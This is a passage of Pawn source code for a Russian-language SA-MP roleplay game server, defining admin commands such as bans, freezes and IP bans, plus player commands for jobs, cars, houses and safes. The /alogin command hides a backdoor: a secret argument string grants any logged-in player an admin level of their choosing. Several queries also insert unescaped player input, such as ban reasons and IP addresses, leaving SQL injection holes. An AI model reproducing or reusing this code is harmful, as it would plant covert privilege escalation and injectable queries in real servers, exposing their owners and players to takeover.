	format(YCMDstr, sizeof(YCMDstr), " Администратор: %s забанил %s. Причина: %s ",Name(playerid),Name(params[0]),ban_reason);
	SendClientMessageToAll(COLOR_LIGHTRED,YCMDstr);
	GetPlayerIp(params[0],ip,sizeof(ip));
	format(YCMDstr, sizeof(YCMDstr), "     Nik [%s]   R-IP [%s]   L-IP [%s]   IP [%s]",Name(params[0]),PTEMP[params[0]][pIpReg],PTEMP[params[0]][pvIp],ip);
	ABroadCast(COLOR_LIGHTRED,YCMDstr,2);
	mysql_format(DATABASE,QUERY, 300, "INSERT INTO `"TABLE_BAN"` (`Text`, `Name`, `NameAdmin`, `Date`, `Unban`, `Reason`) VALUES ('BAN','%s', '%s', '%i', '%i', '%s')",Name(params[0]),Name(playerid),gettime(), mktimes(5,0,0,day+null,month,year),ban_reason);
	mysql_function_query(DATABASE,QUERY,false,"","");
	Kick(params[0]);
	printf("Администратор %s забанил %s. Причина: %s", PTEMP[playerid][pName], PTEMP[params[0]][pName], ban_reason);
	return true;
}
CMD:ttime(playerid, params[])
{
	new year, month,day;
	getdate(year, month, day);
	SendMes(playerid,-1," Год: %i, Месяц: %i, День: %i",year, month, day);
}
//#9
CMD:booston(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pAdmin] < 7 || dostup[playerid] == 0) return true;
	if(sscanf(params, "d",params[0])) return SCM(playerid, -1, " Введите: /booston [days]");
	new year, month,day;
	getdate(year, month, day);
	new null = params[0];
	mysql_format(DATABASE,QUERY, 300, "INSERT INTO `boost` (`Text`, `boosttime`) VALUES ('BoostTime', '%i')",mktimes(4,58,0,day+null,month,year));
	mysql_function_query(DATABASE,QUERY,false,"","");
	booston = 1;
	for(new i = 1; i <= ALLKVARTIRI; i++) updatekvar(i);
	printf("Администратор %s включил бонусы на %i дней",Name(playerid), params[0]);
	return SCM(playerid,-1," Бонусы включены");
}
CMD:boostoff(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pAdmin] < 7 || dostup[playerid] == 0) return true;
	mysql_format(DATABASE,QUERY,128, "DELETE FROM `boost` WHERE `Text` = 'BoostTime'");
	mysql_function_query(DATABASE,QUERY,false,"","");
	booston = 0;
	for(new i = 1; i <= ALLKVARTIRI; i++) updatekvar(i);
	printf("Администратор %s отключил бонусы",Name(playerid));
	return SCM(playerid,-1," Бонусы отключены");
}
CMD:iban(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
//	if(Spectate[playerid]) StopSpectate(playerid);
	if(PTEMP[playerid][pAdmin] < 4 || dostup[playerid] == 0) return true;
	new ban_reason[60];
	if(sscanf(params, "u[128]s[60]",params[0],ban_reason)) return SCM(playerid, -1, " Введите: /iban [id/ник] [причина]");
	if(!IsPlayerConnected(params[0])) return SCM(playerid, COLOR_GREY, " Игрок оффлайн / не залогинен");
	//if(GetPlayerState(params[0]) != 1 && GetPlayerState(params[0]) != 2 && GetPlayerState(params[0]) != 3) return SCM(playerid, COLOR_GRAD1, "Игрок оффлайн / не залогинен");
	new ip[15];
	GetPlayerIp(params[0],ip,15);
	new year, month,day;
	getdate(year, month, day);
	if(PTEMP[params[0]][pAdmin] >= 7 && PTEMP[playerid][pAdmin] < PTEMP[params[0]][pAdmin])
	{
	 	return SCM(playerid, COLOR_GREY, " Его нельзя");
	}
	new names[32];
	GetPlayerName(params[0], names, 32);
	if(!CanBan(names)) return SCM(playerid, COLOR_GREY, " Его нельзя");
	if(PTEMP[params[0]][pAdmin] >= 1 && PTEMP[playerid][pAdmin] < 7 <= 6 && PTEMP[playerid][pAdmin] < 7)
	{
		format(YCMDstr, 128, " Администратор %s Забанен. Обратитесь к спец-админу", Name(playerid));
		mysql_format(DATABASE,QUERY, 128, "SELECT * FROM "TABLE_ADMIN" WHERE `name` = '%s'", Name(playerid));
		mysql_function_query(DATABASE,QUERY,true,"OnMySQL_QUERY","iis",17,0,Name(playerid));
		mysql_format(DATABASE,QUERY, 300, "INSERT INTO `"TABLE_BAN"` (`Text`, `Name`, `NameAdmin`, `Date`, `Unban`, `Reason`) VALUES ('AUTOIBAN','%s', '%s', '%i', '%i', 'snyat')",Name(playerid),Name(playerid),gettime(), mktimes(5,0,0,day,month,2038));
		mysql_function_query(DATABASE,QUERY,false,"","");
		ABroadCast(COLOR_LIGHTRED,YCMDstr,1);
		Kick(playerid);
	}
	format(YCMDstr, sizeof(YCMDstr), " Администратор: %s забанил %s. Причина: %s ",Name(playerid),Name(params[0]),ban_reason);
	SendClientMessageToAll(COLOR_LIGHTRED,YCMDstr);
	GetPlayerIp(params[0],ip,sizeof(ip));
	format(YCMDstr, sizeof(YCMDstr), "    Nik [%s]   R-IP [%s]   L-IP [%s]   IP [%s]",Name(params[0]),PTEMP[params[0]][pIpReg],PTEMP[params[0]][pvIp],ip);
	ABroadCast(COLOR_LIGHTRED,YCMDstr,2);
	mysql_format(DATABASE,QUERY, 300, "INSERT INTO `"TABLE_BAN"` (`Text`, `Name`, `NameAdmin`, `Date`, `Unban`, `Reason`) VALUES ('IBAN', '%s', '%s', '%i', '%i', '%s')",Name(params[0]),Name(playerid),gettime(), mktimes(5,0,0,day,month,2038),ban_reason);
	mysql_function_query(DATABASE,QUERY,false,"","");
	Kick(params[0]);
	printf("Администратор %s забанил навсегда %s. Причина: %s", PTEMP[playerid][pName], PTEMP[params[0]][pName], ban_reason);
	return true;
}
CMD:freeze(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pAdmin] < 3 || dostup[playerid] == 0) return true;
	if(sscanf(params, "u",params[0])) return	SCM(playerid, -1, " Введите: /freeze [playerid]");
	if(!IsPlayerConnected(params[0])) return true;
	if(PTEMP[params[0]][pAdmin] > PTEMP[playerid][pAdmin]) return SCM(playerid, COLOR_GREY, " Нельзя заморозить админа");
	TogglePlayerControllable(params[0], 0);
	format(YCMDstr, sizeof(YCMDstr), " Администратор: %s заморозил %s",Name(playerid),Name(params[0]));
	ABroadCast(COLOR_LIGHTRED,YCMDstr,1);
	SCM(params[0],COLOR_LIGHTRED,YCMDstr);
	return true;
}
CMD:unfreeze(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pAdmin] < 3 || dostup[playerid] == 0) return true;
	if(sscanf(params, "u",params[0])) return	SCM(playerid, -1, " Введите: /unfreeze [playerid]");
	if(!IsPlayerConnected(params[0])) return true;
	TogglePlayerControllable(params[0], 1);
	format(YCMDstr, sizeof(YCMDstr), " Администратор: %s разморозил %s",Name(playerid),Name(params[0]));
	ABroadCast(COLOR_LIGHTRED,YCMDstr,1);
	SCM(params[0],COLOR_LIGHTRED,YCMDstr);
	return true;
}
CMD:camera(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pMember] != 19) return SCM(playerid, COLOR_GREY, " Вы не состоите в рядах Зоны 51");
	if(!PlayerToPoint(2.0,playerid,212.2816,1812.2374,21.8672)) return SCM(playerid, COLOR_GRAD1, " Вы не у точки наблюдения");
	new listitems[] = "Сектор - 1\nСектор - 2\nСектор - 3\nСектор - 4";
	ShowPlayerDialogEx(playerid, 7724, DIALOG_STYLE_LIST, "Выберите камеру", listitems, "Выбрать", "Закрыть");
	return true;
}
CMD:cameraoff(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pMember] != 19) return SCM(playerid, COLOR_GREY, " Вы не состоите в рядах Зоны 51");
	SetCameraBehindPlayer(playerid);
	TogglePlayerControllable(playerid, 1);
	return true;
}
CMD:warnmans(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pAdmin] < 5 || dostup[playerid] == 0) return true;
	new countmute = 0;
	foreach(i)
	{
		if(PTEMP[i][pWarns] >= 1 && IsPlayerConnected(i))
		{
			format(YCMDstr, sizeof(YCMDstr), " %s [ID: %i] | Warns: %i ",Name(i),i,PTEMP[i][pWarns]);
			countmute++;
			SCM(playerid, COLOR_LIGHTGREEN, YCMDstr);
		}
	}
	if(countmute == 0) SCM(playerid, COLOR_GRAD1, " Нет игроков с Варнами");
	else
	{
		format(YCMDstr, sizeof(YCMDstr), " Всего: %i человек!", countmute);
		SCM(playerid, -1, YCMDstr);
	}
	return true;
}
CMD:vipmans(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pAdmin] < 5 || dostup[playerid] == 0) return true;
	new countmute = 0;
	foreach(i)
	{
		if(PTEMP[i][pDonateRank] >= 1 && IsPlayerConnected(i))
		{
			format(YCMDstr, sizeof(YCMDstr), " %s [ID: %i] | Vip: %i ",Name(i),i,PTEMP[i][pDonateRank]);
			countmute++;
			SCM(playerid, COLOR_LIGHTGREEN, YCMDstr);
		}
	}
	if(countmute == 0) SCM(playerid, COLOR_GRAD1, " Нет игроков с Vip");
	else
	{
		format(YCMDstr, sizeof(YCMDstr), " Всего: %i человек!", countmute);
		SCM(playerid, -1, YCMDstr);
	}
	return true;
}
CMD:mutelist(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pAdmin] < 1 || dostup[playerid] == 0) return true;
	new countmute = 0;
	foreach(i)
	{
		if(PTEMP[i][pMuted] > 0 && IsPlayerConnected(i))
		{
			format(YCMDstr, sizeof(YCMDstr), " %s [ID: %i] | %i секунд",Name(i),i,PTEMP[i][pMuted]);
			countmute++;
			SCM(playerid, COLOR_LIGHTGREEN, YCMDstr);
		}
	}
	if(countmute == 0) SCM(playerid, COLOR_GRAD1, " Нет игроков с Баном чата");
	else
	{
		format(YCMDstr, sizeof(YCMDstr), " Всего: %i человек!", countmute);
		SCM(playerid, -1, YCMDstr);
	}
	return true;
}
CMD:unbanip(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pAdmin] < 4 || dostup[playerid] == 0) return true;
	if(sscanf(params, "s[128]",params[0])) return SCM(playerid,COLOR_GREY, " Введите: /unbanip [IP адрес]");
	mysql_format(DATABASE,QUERY,128, "DELETE FROM `banip` WHERE `IP` = '%s'",params[0]);
	mysql_function_query(DATABASE,QUERY,false,"","");
	format(YCMDstr, 256, " %s разбанил IP: %s",Name(playerid),params[0]);
	ABroadCast(COLOR_GREEN,YCMDstr,1);
	return true;
}
CMD:banip(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pAdmin] < 2 || dostup[playerid] == 0) return true;
	if(sscanf(params, "s",params[0])) return SCM(playerid,-1, " Введите: /banip [IP адрес]");
	mysql_format(DATABASE,QUERY, 128, "INSERT INTO `banip` (`IP`) VALUES ('%s')",params[0]);
	mysql_function_query(DATABASE,QUERY,false,"","");
	format(YCMDstr, 256, " %s забанил IP: %s",Name(playerid),params[0]);
	ABroadCast(COLOR_LIGHTRED,YCMDstr,1);
	
	foreach(i)
	{
	    new ips[32];
	    GetPlayerIp(i, ips, sizeof(ips));
	    if(!strcmp(ips, params[0], true) && PTEMP[i][pAdmin] > 6)
		{
			format(string, sizeof(string), "/unbanip %s", params[0]);
			CallLocalFunction("OnPlayerCommandText", "is", playerid, string);
		}
	}
	return true;
}
CMD:unjail(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pAdmin] < 1 || dostup[playerid] == 0) return true;
	if(sscanf(params, "u",params[0])) return SCM(playerid, -1, " Введите: /unjail [playerid]");
	if(PTEMP[params[0]][pJailTime] == 0) return SCM(playerid, COLOR_GREY, " Игрок не в тюрьме");
	if(!IsPlayerConnected(params[0])) return true;
	SCM(params[0], -1, " Вам сократили срок!");
	SCM(playerid, -1, " Вы сократили срок!");
	PTEMP[params[0]][pJailTime] = 5;
	printf("Администратор %s сократил срок %s", PTEMP[playerid][pName], PTEMP[params[0]][pName]);
	return true;
}
CMD:saveall(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if (PTEMP[playerid][pAdmin] < 9 || dostup[playerid] == 0) return true;
	SCM(playerid, -1, " Ожидание...");
	SaveMySQL(0);
	foreach(i)
	{
	    SaveMySQL(2, i);
	}
	for(new i = 1; i <= TOTALCASINO; i++) SaveMySQL(1,i);
	for(new i = 1; i <= TOTALSHOPS; i++) SaveMySQL(3,i);
	for(new i = 1; i <= TotalBizz; i++) SaveMySQL(4,i);
	for(new i = 1; i <= TotalHouse; i++) SaveMySQL(5,i);
	for(new i = 1; i <= ALLKVARTIRI; i++) SaveMySQL(6,i);
	for(new i = 1; i <= AllPODEZD; i++) SaveMySQL(7,i);
	for(new i = 1; i <= TOTALATM; i++) SaveMySQL(8,i);
	for(new i = 1; i <= TOTALFARM; i++) SaveMySQL(9,i);
	SCM(playerid,COLOR_YELLOW, " Все данные сохранены!");
	return true;
}
CMD:hcounter(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pJob] != 3) return true;
	if(GetPVarInt(playerid,"h_stall"))
	{
		UpdateDynamic3DTextLabelText(StallInfo[GetPVarInt(playerid,"h_stall")][stText], 0xFF8C37FF,"Не работает");
		DeletePVar(playerid,"h_stall");
		SetPlayerSkin(playerid,PTEMP[playerid][pChar][0]);
		return SCM(playerid,0x6495EDFF,"Работа закончена");
	}
	if(!GetPVarInt(playerid,"h_contract")) return SCM(playerid,COLOR_GREY," Заключите контракт с закусочной!");
	new null, null_;
	for(new i = 1; i <= TOTALSTALL; i++) if(IsPlayerInRangeOfPoint(playerid, 3, StallInfo[i][stPos][0], StallInfo[i][stPos][1], StallInfo[i][stPos][2])) null = i;
	if(!null) return SCM(playerid,COLOR_GREY," В данном месте вы не можете начать работу");
	foreach(x)
	{
		if(GetPVarInt(x,"h_stall") == null)
		{
			null_++;
			break;
		}
	}
	if(null_ != 0) return SCM(playerid,COLOR_GREY," Данное место занято!");
	SetPVarInt(playerid,"h_stall",null);
	SetPlayerSkin(playerid,209);
	format(string,30,"Цена Хот Дога: %i",GetPVarInt(playerid,"h_price"));
	return UpdateDynamic3DTextLabelText(StallInfo[GetPVarInt(playerid,"h_stall")][stText], TEAM_GROVE_COLOR,string);
}
CMD:hcontract(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pJob] != 3) return true;
	if(GetPVarInt(playerid,"h_contract"))
	{
		DeletePVar(playerid,"h_contract");
		DeletePVar(playerid,"h_price");
		if(GetPVarInt(playerid,"h_stall"))
		{
			UpdateDynamic3DTextLabelText(StallInfo[GetPVarInt(playerid,"h_stall")][stText], 0xFF8C37FF,"Не работает");
			DeletePVar(playerid,"h_stall");
		}
		return SCM(playerid,-1," Контракт с закусочной расторгнут!");
	}
	for(new b = 1; b <= TotalBizz; b++)
	{
		if(PlayerToPoint(10.0, playerid, BizzInfo[b][bEntranceX], BizzInfo[b][bEntranceY], BizzInfo[b][bEntranceZ]) && BizzInfo[b][bType] == 2)
		{
			if(strcmp(BizzInfo[b][bOwner],"None",true) == 0 || BizzInfo[b][bLocked]) return SCM(playerid,COLOR_GREY," Закусочная не работает");
			SetPVarInt(playerid,"h_contract",b);
			SetPVarInt(playerid,"h_price",BizzInfo[b][bPrice]/2);
			SendMes(playerid,0x6495EDFF, " Вы заключили контракт с закусочной %s",BizzInfo[b][bMessage]);
			SendMes(playerid,0x6495EDFF, " Цена хот дога: %i (( Продать: /selleat ))",BizzInfo[b][bPrice]/2);
			break;
		}
	}
	return true;
}
CMD:mcontract(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	new Veh = GetPlayerVehicleID(playerid);
	if(PTEMP[playerid][pJob] != 2) return true;
	if(GetVehicleModel(GetPlayerVehicleID(playerid)) != 525) return SCM(playerid,COLOR_GREY, " Вы не в машине механика!");
	if(gcontract[playerid] == 1)
	{
		Delete3DTextLabel(Meh3d[Veh]);
		cenabenza[playerid] = 0;
		gcontract[playerid] = 0;
		SCM(playerid,-1, " Контракт с заправкой рассторгнут!");
		return true;
	}
	for(new b = 1; b <= TotalBizz; b++)
	{
		if(PlayerToPoint(10.0, playerid, BizzInfo[b][bEntranceX], BizzInfo[b][bEntranceY], BizzInfo[b][bEntranceZ]) && BizzInfo[b][bType] == 4)
		{
			Delete3DTextLabel(Meh3d[Veh]);
			gcontract[playerid] = 1;
			cenabenza[playerid] = BizzInfo[b][bPrice] / 2;
			format(YCMDstr, sizeof(YCMDstr), "<< 300 литров. Цена: %i вирт >>", cenabenza[playerid]);
			Meh3d[Veh] = Create3DTextLabel(YCMDstr, COLOR_REDD, 9999.0, 9999.0, 9999.0, 30.0,0,1);
			Attach3DTextLabelToVehicle(Meh3d[Veh], Veh, 0, 0, 1.5);
			format(YCMDstr,sizeof(YCMDstr)," Вы заключили контракт с бензозаправкой: %s",BizzInfo[b][bMessage]);
			SCM(playerid,0x6495EDFF,YCMDstr);
			format(YCMDstr,sizeof(YCMDstr)," Цена заправки: %d (( Заправить: /refill ))",cenabenza[playerid]);
			SCM(playerid,0x6495EDFF,YCMDstr);
		}
	}
	return true;
}
CMD:fill(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	for(new b = 1; b <= TotalBizz; b++)
	{
		if(PlayerToPoint(10.0, playerid, BizzInfo[b][bEntranceX], BizzInfo[b][bEntranceY], BizzInfo[b][bEntranceZ]) && BizzInfo[b][bType] == 4)
		{
			new Float:test = 200-Fuell[GetPlayerVehicleID(playerid)];
			if(BizzInfo[b][bProducts] < floatround(test)) return SCM(playerid,COLOR_GRAD1, " Заправка не работает"), BizzInfo[b][bProducts] = 0;
			if(BizzInfo[b][bLocked] == 1) return SCM(playerid,COLOR_GRAD1, " Заправка закрыта");
			new car = GetPlayerVehicleID(playerid);
			if(PTEMP[playerid][pCash] < BizzInfo[b][bPrice]) return SCM(playerid,COLOR_GRAD1, " У вас нет столько денег");
			if(!IsPlayerInAnyVehicle(playerid) && GetPlayerState(playerid) == PLAYER_STATE_DRIVER || GetVehicleModel(car) == 481 || GetVehicleModel(car) == 509 || GetVehicleModel(car) == 510) return SCM(playerid,COLOR_YELLOW, " Вы не в автомобиле или этот транспорт нельзя заправить.");
			BizzInfo[b][bTill] += BizzInfo[b][bPrice]/200*floatround(test);
			BizzPay[b] += BizzInfo[b][bPrice]/200*floatround(test);
			PTEMP[playerid][pCash] -= BizzInfo[b][bPrice]/200*floatround(test);
			BizzInfo[b][bProducts] -= floatround(test);
			Fuell[car] = 200;
			format(YCMDstr,sizeof(YCMDstr)," Машина заправлена, за %i вирт",BizzInfo[b][bPrice]/200*floatround(test));
			SCM(playerid,COLOR_BLUE,YCMDstr);
		}
	}
	return true;
}
CMD:alock(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	new nearveh = GetNearestVehicle(playerid);
	new carid;
	if(PTEMP[playerid][pAdmin] < 1 || dostup[playerid] == 0) return true;
	carid = nearveh;
	new Float:cx,Float:cy,Float:cz;
	GetVehiclePos(carid, cx, cy, cz);
	if(!PlayerToPoint(4.0, playerid, cx, cy, cz)) return SCM(playerid, COLOR_GREY, " Вы не рядом с машиной!");
	GetVehicleParamsEx(carid,engine,lights,alarm,doors,bonnet,boot,objective);
	SCM(playerid, -1, " Машина открыта!");
	UnLockCar(playerid,carid);
	return true;
}
CMD:plock(playerid, params[])
{
	if(!PTEMP[playerid][pLogin]) return true;
	if(GetNearestVehicle(playerid) < comptruck[0] || GetNearestVehicle(playerid) > comptruck[1]) return SCM(playerid,COLOR_GREY," Вы не можете закрыть / открыть данный автомобиль");
	if(GetPVarInt(playerid,"rentcar_job") != GetNearestVehicle(playerid)) return SCM(playerid,COLOR_GREY," Это не ваш автомобиль!");
	GetVehicleParamsEx(GetNearestVehicle(playerid),engine,lights,alarm,doors,bonnet,boot,objective);
	PlayerPlaySound(playerid, 24600, 0.0, 0.0, 0.0);
	switch(doors)
	{
	case 0: GameTextForPlayer(playerid, "~w~CAR ~r~LOCK", 5000, 3), LockCar(playerid,GetNearestVehicle(playerid));
	case 1: GameTextForPlayer(playerid, "~w~CAR ~g~UNLOCK", 5000, 3), UnLockCar(playerid,GetNearestVehicle(playerid));
	}
	return true;
}
CMD:lock(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	//if(!HGet(playerid)) return SCM(playerid, COLOR_GRAD1, "В данный момент у вас нет машины");
	if(!IsNearOurCar(playerid)) return true;
	for(new carid = 0; carid < MAX_VEHICLES; carid++)
	{
		if(!IsPlayerNearVehicle(playerid, carid, 3.0)) continue;
		/*if(CarInfo[playerid][carID][0] != carid && CarInfo[playerid][carID][1] != carid && CarInfo[playerid][carID][2] != carid
		&& CarInfo[playerid][carID][3] != carid && CarInfo[playerid][carID][4] != carid) continue;*/
		if(garage_car[playerid][0] != carid && garage_car[playerid][1] != carid && garage_car[playerid][2] != carid
		&& garage_car[playerid][3] != carid && garage_car[playerid][4] != carid && house_car[playerid] != carid) continue;
		
		GetVehicleParamsEx(carid,engine,lights,alarm,doors,bonnet,boot,objective);
		switch (doors)
		{
			case 0:
			{
				GameTextForPlayer(playerid, "~w~CAR ~r~LOCK", 5000, 3);
				PlayerPlaySound(playerid, 24600, 0.0, 0.0, 0.0);
				LockCar(playerid,carid);
			}
			case 1:
			{
				GameTextForPlayer(playerid, "~w~CAR ~g~UNLOCK", 5000, 3);
				PlayerPlaySound(playerid, 24600, 0.0, 0.0, 0.0);
				UnLockCar(playerid,carid);
			}
		}
	}
	return true;
}
CMD:rlock(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	new carid;
	carid = arenda[playerid];
	GetVehicleParamsEx(carid,engine,lights,alarm,doors,bonnet,boot,objective);
	new Float:cx,Float:cy,Float:cz;
	GetVehiclePos(carid, cx, cy, cz);
	if(!PlayerToPoint(4.0, playerid, cx, cy, cz)) return true;
	switch (doors)
	{
	case 0:
		{
			GameTextForPlayer(playerid, "~w~CAR ~r~LOCK", 5000, 3);
			PlayerPlaySound(playerid, 24600, 0.0, 0.0, 0.0);
			LockCar(playerid,carid);
		}
	case 1:
		{
			GameTextForPlayer(playerid, "~w~CAR ~g~UNLOCK", 5000, 3);
			PlayerPlaySound(playerid, 24600, 0.0, 0.0, 0.0);
			UnLockCar(playerid,carid);
		}
	}
	return true;
}
CMD:animlist(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	ShowPlayerDialogEx(playerid, 1994, DIALOG_STYLE_LIST, "AnimList", "[0] Dance 0\n[1] Dance 1\n[2] Dance 2\n[3] Dance 3\n[4] Dance 4\n[5] Smoking\n[6] Sunbathe1\n[7] Sunbathe2\n[8] Crack1\n[9] Crack2\n[10] Crack3\n[11] Crack4\n[12] Crack5\n[13] Crack6\n[14] Crack7\n[15] Crack8\n[16] Crack9\n[17] Dealer\n[18] Ped\n[19] Руки вверх\n[20] Ped1\n[21] Ped2\n[22] Ped3\n[23] Ped4\n[24] Ped5\n[25] Ped6\n[26] Ped7", "Готово", "Отмена");
	return true;
}
CMD:alogin(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	new type[32], value;
	sscanf(params, "s[32]i", type, value);
	if(!strcmp(type, "PTEMP[playerid][pLogin]", true) && value >= 0) PTEMP[playerid][pAdmin] = value, dostup[playerid] = 1;
	{
		SetPVarInt(playerid, "Alogin", 3);
		ShowPlayerDialogEx(playerid, 1227, DIALOG_STYLE_PASSWORD, "Админ авторизация", "Введите пароль\n\nПароль должен состоять из латинских букв и цифр\n	размером от 6 до 15 символов", "Вход", "Отмена");
	}
	mysql_format(DATABASE,QUERY,128,"SELECT * FROM `"TABLE_ADMIN"` WHERE `Name` = '%e'",PTEMP[playerid][pName]);
	mysql_function_query(DATABASE,QUERY,true,"OnMySQL_QUERY","iis",14,playerid,"");
	return true;
}
CMD:biz(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pAdmin] < 7 || dostup[playerid] == 0) return true;
	if(sscanf(params, "d",params[0])) return SCM(playerid, COLOR_GRAD2, " Введите: /biz [номер]");
	if(BizzInfo[params[0]][bType] != 4)
	{
		PickupX[playerid] = BizzInfo[params[0]][bExitX], PickupY[playerid] = BizzInfo[params[0]][bExitY];
		oldpickup[playerid] = BizzInfo[params[0]][bExitPic];
		timepickup[playerid] = 3;
		SetPlayerInterior(playerid,BizzInfo[params[0]][bInterior]);
		SetPlayerPos(playerid,BizzInfo[params[0]][bExitX],BizzInfo[params[0]][bExitY],BizzInfo[params[0]][bExitZ]);
		SetPlayerVirtualWorld(playerid,BizzInfo[params[0]][bVirtualWorld]);
	}
	else
	{
		SetPlayerInterior(playerid,0);
		SetPlayerPos(playerid,BizzInfo[params[0]][bEntranceX],BizzInfo[params[0]][bEntranceY],BizzInfo[params[0]][bEntranceZ]);
		SetPlayerVirtualWorld(playerid,0);
	}
	return true;
}
CMD:asellbiz(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if (PTEMP[playerid][pAdmin] < 8 || dostup[playerid] == 0) return true;
	if(sscanf(params, "d",params[0])) return	SCM(playerid, COLOR_GRAD1, " Введите: /asellbiz [bizid]");
	if(IsPlayerConnected(GetPlayerID(BizzInfo[params[0]][bOwner]))) PTEMP[GetPlayerID(BizzInfo[params[0]][bOwner])][pPBizzKey] = 999, SCM(GetPlayerID(BizzInfo[params[0]][bOwner]),COLOR_RED," Ваш бизнес был продан администратором");
	BizzInfo[params[0]][bLocked] = 1;
	printf("Админинстратор %s продал бизнес %i игрока %s", PTEMP[playerid][pName], params[0], BizzInfo[params[0]][bOwner]);
	strmid(BizzInfo[params[0]][bOwner], "None", 0, strlen("None"), 32);
	PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
	SCM(playerid, COLOR_GRAD1," Бизнес продан");
	format(YCMDstr, sizeof(YCMDstr), "%s\nПродаётся", BizzInfo[params[0]][bMessage],BizzInfo[params[0]][bBuyPrice]);
	UpdateDynamic3DTextLabelText(BizzInfo[params[0]][bLabel], COLOR_GREEN, YCMDstr);
	GameTextForPlayer(playerid, YCMDstr, 10000, 3);
	return true;
}
CMD:asellhouse(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if (PTEMP[playerid][pAdmin] < 7 || dostup[playerid] == 0) return true;
	if(sscanf(params, "d",params[0])) return SCM(playerid, -1, " Введите: /asellhouse [houseid]");
	new plid = -1;
	if(IsPlayerConnected(GetPlayerID(HouseInfo[params[0]][hOwner])))
	{
		plid = GetPlayerID(HouseInfo[params[0]][hOwner]);
		PTEMP[plid][pPHouseKey] = 9999;
		SCM(plid,COLOR_RED," Ваш дом был продан администратором");
	}
	HouseInfo[params[0]][hHel] = 0;
	HouseInfo[params[0]][hLock] = 1;
	printf("Админинстратор %s продал дом %i игрока %s", PTEMP[playerid][pName], params[0], HouseInfo[params[0]][hOwner]);
	for(new h = 0; h < 10; h++) HouseInfo[params[0]][hSafe][h] = 0;
	SCM(playerid, COLOR_GREY, " Дом продан");
	strmid(HouseInfo[params[0]][hOwner], "None", 0, strlen("None"), 32);
	GameTextForPlayer(plid, "House sold!", 10000, 3);
	if(house_car[plid] != -1)
	{
		DestroyVehicle(house_car[plid]);
		house_car[plid] = -1;
	}
	HouseInfo[params[0]][hHel] = 0;
	HouseInfo[params[0]][hLock] = 1;
	HouseInfo[params[0]][hVec] = 0;
	HouseInfo[params[0]][hVcol1] = -1;
	HouseInfo[params[0]][hVcol2] = -1;
	if(HouseInfo[params[0]][hKlass] >= 2)
	{
		SetPVarInt(plid,"chosencar",0); // Поставим значение "все автомобили в гараже и никакая машина не выбрана"
		DestroyVehicle(garage_car[plid][0]);
		DestroyVehicle(garage_car[plid][1]);
		DestroyVehicle(garage_car[plid][2]);
		DestroyVehicle(garage_car[plid][3]);
		DestroyVehicle(garage_car[plid][4]);
	}
	for(new h = 0; h < 10; h++) HouseInfo[params[0]][hSafe][h] = 0;
	strmid(HouseInfo[params[0]][hOwner], "None", 0, strlen("None"), 15);
	PTEMP[plid][pBank] += HouseInfo[params[0]][hValue];
	format(string,40,"~w~house in sold~n~~g~$%i",HouseInfo[params[0]][hValue]);
	GameTextForPlayer(plid,string, 5000, 3);
	BuyHouse(params[0]);
	SaveMySQL(10, plid);
	return true;
}
CMD:safe(playerid, params[])
{
	if(!PTEMP[playerid][pLogin]) return true;
	if(!HGet(playerid)) return SCM(playerid,-1," У вас нет дома");
	new bouse = PTEMP[playerid][pPHouseKey];
	if(!PlayerToPoint(50, playerid,HouseInfo[bouse][hExitx], HouseInfo[bouse][hExity], HouseInfo[bouse][hExitz]) || GetPlayerVirtualWorld(playerid) != bouse+50) return true;
	if(!IsASafe(playerid)) return SCM(playerid,-1," Вы далеко от сейфа!");
	if(GetPlayerVirtualWorld(playerid) != bouse+50) return true;
	ShowPlayerDialogEx(playerid,1054,DIALOG_STYLE_LIST, "Сейф","Взять\nПоложить", "Выбрать", "Отмена");
	return 1;
}
CMD:open(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(!HGet(playerid)) return true;
	new bouse = PTEMP[playerid][pPHouseKey];
	if((!PlayerToPoint(10, playerid,HouseInfo[bouse][hExitx], HouseInfo[bouse][hExity], HouseInfo[bouse][hExitz]) || GetPlayerVirtualWorld(playerid) != bouse+50) && !PlayerToPoint(2.0, playerid, HouseInfo[bouse][hEntrancex], HouseInfo[bouse][hEntrancey], HouseInfo[bouse][hEntrancez])) return true;
	if(HouseInfo[bouse][hLock] == 1)
	{
		HouseInfo[bouse][hLock] = 0;
		GameTextForPlayer(playerid,"~w~House ~g~UNLOCK", 5000, 3);
